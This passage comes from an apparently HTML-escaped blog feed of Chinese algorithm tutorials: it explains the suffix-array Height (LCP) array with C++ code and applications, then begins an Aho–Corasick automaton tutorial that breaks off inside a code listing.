&lt;h1 id=&#34;构造最长公共前缀——Height&#34;&gt;&lt;a href=&#34;#构造最长公共前缀——Height&#34; class=&#34;headerlink&#34; title=&#34;构造最长公共前缀——Height&#34;&gt;&lt;/a&gt;构造最长公共前缀——Height&lt;/h1&gt;&lt;h2 id=&#34;同样先是定义一些变量&#34;&gt;&lt;a href=&#34;#同样先是定义一些变量&#34; class=&#34;headerlink&#34; title=&#34;同样先是定义一些变量&#34;&gt;&lt;/a&gt;同样先是定义一些变量&lt;/h2&gt;&lt;p&gt;Heigth[i] : 表示Suffix[SA[i]]和Suffix[SA[i - 1]]的最长公共前缀，也就是排名相邻的两个后缀的最长公共前缀&lt;br&gt;H[i] : 等于Height[Rank[i]]，也就是后缀Suffix[i]和它前一名的后缀的最长公共前缀&lt;br&gt;而两个排名不相邻的最长公共前缀定义为排名在它们之间的Height的最小值。&lt;br&gt;跟上面一样，先形像的理解一下：  &lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20160205125636006&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;高效地得到Height数组&#34;&gt;&lt;a href=&#34;#高效地得到Height数组&#34; class=&#34;headerlink&#34; title=&#34;高效地得到Height数组&#34;&gt;&lt;/a&gt;高效地得到Height数组&lt;/h2&gt;&lt;p&gt;如果一个一个数按SA中的顺序比较的话复杂度是O(N2N2)级别的，想要快速的得到Height就需要用到一个关于H数组的性质。&lt;br&gt;H[i] ≥ H[i - 1] - 1!&lt;br&gt;如果上面这个性质是对的，那我们可以按照H[1]、H[2]……H[Len]的顺序进行计算，那么复杂度就降为O(N)了！&lt;br&gt;让我们尝试一下证明这个性质 : 设Suffix[k]是排在Suffix[i - 1]前一名的后缀，则它们的最长公共前缀是H[i - 1]。都去掉第一个字符，就变成Suffix[k + 1]和Suffix[i]。如果H[i - 1] &amp;#x3D; 0或1,那么H[i] ≥ 0显然成立。否则，H[i] ≥ H[i - 1] - 1(去掉了原来的第一个,其他前缀一样相等)，所以Suffix[i]和在它前一名的后缀的最长公共前缀至少是H[i - 1] - 1。&lt;br&gt;仔细想想还是比较好理解的。H求出来，那Height就相应的求出来了，这样结合SA，Rank和Height我们就可以做很多关于字符串的题了！  &lt;/p&gt;
&lt;h1 id=&#34;代码——Code&#34;&gt;&lt;a href=&#34;#代码——Code&#34; class=&#34;headerlink&#34; title=&#34;代码——Code&#34;&gt;&lt;/a&gt;代码——Code&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Problem: JZOJ1598(询问一个字符串中有多少至少出现两次的子串)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Content: SA&amp;#x27;s Code and Explanation&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Author : YxuanwKeith&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;const int MAXN = 100005;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char ch[MAXN], All[MAXN];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int SA[MAXN], rank[MAXN], Height[MAXN], tax[MAXN], tp[MAXN], a[MAXN], n, m; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char str[MAXN];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//rank[i] 第i个后缀的排名; SA[i] 排名为i的后缀位置; Height[i] 排名为i的后缀与排名为(i-1)的后缀的LCP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//tax[i] 计数排序辅助数组; tp[i] rank的辅助数组(计数排序中的第二关键字),与SA意义一样。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//a为原串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void RSort() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //rank第一关键字,tp第二关键字。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 0; i &amp;lt;= m; i ++) tax[i] = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 1; i &amp;lt;= n; i ++) tax[rank[tp[i]]] ++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 1; i &amp;lt;= m; i ++) tax[i] += tax[i-1];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = n; i &amp;gt;= 1; i --) SA[tax[rank[tp[i]]] --] = tp[i]; //确保满足第一关键字的同时，再满足第二关键字的要求&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; //计数排序,把新的二元组排序。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int cmp(int *f, int x, int y, int w) &amp;#123; return f[x] == f[y] &amp;amp;&amp;amp; f[x + w] == f[y + w]; &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//通过二元组两个下标的比较，确定两个子串是否相同&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void Suffix() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //SA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 1; i &amp;lt;= n; i ++) rank[i] = a[i], tp[i] = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    m = 127 ,RSort(); //一开始是以单个字符为单位，所以(m = 127)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int w = 1, p = 1, i; p &amp;lt; n; w += w, m = p) &amp;#123; //把子串长度翻倍,更新rank&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //w 当前一个子串的长度; m 当前离散后的排名种类数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //当前的tp(第二关键字)可直接由上一次的SA的得到&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for (p = 0, i = n - w + 1; i &amp;lt;= n; i ++) tp[++ p] = i; //长度越界,第二关键字为0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for (i = 1; i &amp;lt;= n; i ++) if (SA[i] &amp;gt; w) tp[++ p] = SA[i] - w;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //更新SA值,并用tp暂时存下上一轮的rank(用于cmp比较)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        RSort(), swap(rank, tp), rank[SA[1]] = p = 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //用已经完成的SA来更新与它互逆的rank,并离散rank&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for (i = 2; i &amp;lt;= n; i ++) rank[SA[i]] = cmp(tp, SA[i], SA[i - 1], w) ? p : ++ p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //离散：把相等的字符串的rank设为相同。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //LCP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int j, k = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for(int i = 1; i &amp;lt;= n; Height[rank[i ++]] = k) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for( k = k ? k - 1 : k, j = SA[rank[i] - 1]; a[i + k] == a[j + k]; ++ k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //这个知道原理后就比较好理解程序&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void Init() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    scanf(&amp;quot;%s&amp;quot;, str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    n = strlen(str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 0; i &amp;lt; n; i ++) a[i + 1] = str[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Init();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Suffix();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int ans = Height[2];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 3; i &amp;lt;= n; i ++) ans += max(Height[i] - Height[i - 1], 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;%d\n&amp;quot;, ans);    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;4个比较基础的应用&#34;&gt;&lt;a href=&#34;#4个比较基础的应用&#34; class=&#34;headerlink&#34; title=&#34;4个比较基础的应用&#34;&gt;&lt;/a&gt;4个比较基础的应用&lt;/h1&gt;&lt;p&gt;Q1：一个串中两个串的最大公共前缀是多少？&lt;br&gt;A1：这不就是Height吗？用rmq预处理，再O(1)查询。  &lt;/p&gt;
&lt;p&gt;Q2：一个串中可重叠的重复最长子串是多长？&lt;br&gt;A2：就是求任意两个后缀的最长公共前缀，而任意两个后缀的最长公共前缀都是Height 数组里某一段的最小值，那最长的就是Height中的最大值。  &lt;/p&gt;
&lt;p&gt;Q3：一个串种不可重叠的重复最长子串是多长？&lt;br&gt;A3：先二分答案，转化成判别式的问题比较好处理。假设当前需要判别长度为k是否符合要求，只需把排序后的后缀分成若干组，其中每组的后缀之间的Height 值都不小于k，再判断其中有没有不重复的后缀，具体就是看最大的SA值和最小的SA值相差超不超过k，有一组超过的话k就是合法答案。  &lt;/p&gt;
&lt;p&gt;A4：一个字符串不相等的子串的个数是多少？&lt;br&gt;Q4：每个子串一定是某个后缀的前缀，那么原问题等价于求所有后缀之间的不相同的前缀的个数。而且可以发现每一个后缀Suffix[SA[i]]的贡献是Len - SA[i] + 1,但是有子串算重复，重复的就是Heigh[i]个与前面相同的前缀，那么减去就可以了。最后，一个后缀Suffix[SA[i]]的贡献就是Len - SA[k] + 1 - Height[k]。&lt;br&gt;对于后缀数组更多的应用这里就不详细阐述，经过思考后每个人都会发现它的一些不同的用途，它的功能也许比你想象中的更强大！  &lt;/p&gt;
&lt;h1 id=&#34;最开始的那道题&#34;&gt;&lt;a href=&#34;#最开始的那道题&#34; class=&#34;headerlink&#34; title=&#34;最开始的那道题&#34;&gt;&lt;/a&gt;最开始的那道题&lt;/h1&gt;&lt;p&gt;先搬下来。。。  &lt;/p&gt;
&lt;p&gt;你可想想这道题：你有一个01串S，然后定义一个前缀最右边的位置就是这个前缀的结束位置。现在有很多个询问，每q个询问结束位置在l~r中不同前缀的最长公共后缀是多长？&lt;br&gt;|S|,q≤100000&lt;br&gt;时限4s  &lt;/p&gt;
&lt;p&gt;简单思路：首先可以把字符串反过来就是求后缀的最长公共前缀了，可以用SA求出height数组，然后用rmq预处理之后就是求两个位置间的最小值。然后对于一个区间，显然只有在SA数组中相邻的两个串可以贡献答案。&lt;br&gt;对于区间询问的问题可以用莫队处理，然后考虑加入一个后缀应该怎么处理，我们可以维护一个按SA数组排序的链表。假设我们先把所有位置的SA全部加入，然后按顺序删除，重新按顺序加入时就可以O(1)完成修改。那么按照这个思路我们可以用固定左端点的并查集，做到只加入，不删除，然后用O(n√n+nlogn)O(nn+nlogn)的复杂度完成这道题。  &lt;/p&gt;
&lt;p&gt;&lt;em&gt;可能后面的处理方式比较麻烦，如果直接用splay维护区间中的后缀的话可以做到O(n√n&lt;/em&gt;logn)O(nnlogn)，这个方法就比较直观，而SAM在个问题上还是有点无力的。这题只是为了说明SA相比于SAM还是有他的独到之处，特别是在处理后缀的lcp之类的问题上。  &lt;/p&gt;
</content>
        <updated>2023-01-13T20:10:20.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/14/CPP%E7%AE%97%E6%B3%95AC%E8%87%AA%E5%8A%A8%E6%9C%BA/</id>
        <title>CPP算法AC自动机</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/14/CPP%E7%AE%97%E6%B3%95AC%E8%87%AA%E5%8A%A8%E6%9C%BA/"/>
        <content type="html">&lt;p&gt;首先给定模式串”ash”,”shex”,”bcd”,”sha”,然后我们根据模式串建立如下trie树:&lt;br&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20181006092249946?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后我们再了解下一步:&lt;br&gt;ac自动机,就是在tire树的基础上,增加一个fail指针,如果当前点匹配失败,则将指针转移到fail指针指向的地方,这样就不用回溯,而可以路匹配下去了.(当前模式串后缀和fail指针指向的模式串部分前缀相同,如abce和bcd,我们找到c发现下一个要找的不是e,就跳到bcd中的c处,看看此处的下一个字符(d)是不是应该找的那一个)  &lt;/p&gt;
&lt;p&gt;一般,fail指针的构建都是用bfs实现的&lt;br&gt;首先每个模式串的首字母肯定是指向根节点的  &lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20181006092859165?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34;&gt;&lt;/p&gt;
&lt;p&gt;现在第一层bfs遍历完了,开始第二层&lt;br&gt;(根节点为第0层)第二层a的子节点为s,但是我们还是要从a-z遍历,如果不存在这个子节点我们就让他指向根节点(如下图红色的a)&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20181006093044472?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34;&gt;&lt;/p&gt;
&lt;p&gt;当我们遍历到s的时候,由于存在s这个节点,我们就让他的fail指针指向他父亲节点(a)的fail指针指向的那个节点(根)的具有相同字母的子节点(第一层的s),也就是这样&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20181006093334238?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34;&gt;&lt;/p&gt;
&lt;p&gt;按照相同规律构建第二层后,到了第三层的h点,还是按照上面的规则,我们找到h的父亲节点(s)fail指针指向的那个位置(第一层的s)然后指向它所指向的相同字母根-&amp;gt;s-&amp;gt;h的这个链的h节点,如下图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20181006093412877?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34;&gt;&lt;/p&gt;
&lt;p&gt;完全构造好后的树&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/2018100609362045?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后匹配就很简单了,这里以ashe为例&lt;br&gt;我们先用ash匹配,到h了发现:诶这里ash是一个完整的模式串,好的ans++,然后找下一个e,可是ash后面没字母了啊,我们就跳到hfail指针指向的那个h继续找,还是没有?再跳,结果当前的h指向的是根节点,又从根节点找,然而还是没有找到e,程序END  &lt;/p&gt;
&lt;p&gt;过程如下图  &lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20181006093706548?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34;&gt;&lt;/p&gt;
&lt;p&gt;喜闻乐见模板系列&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span 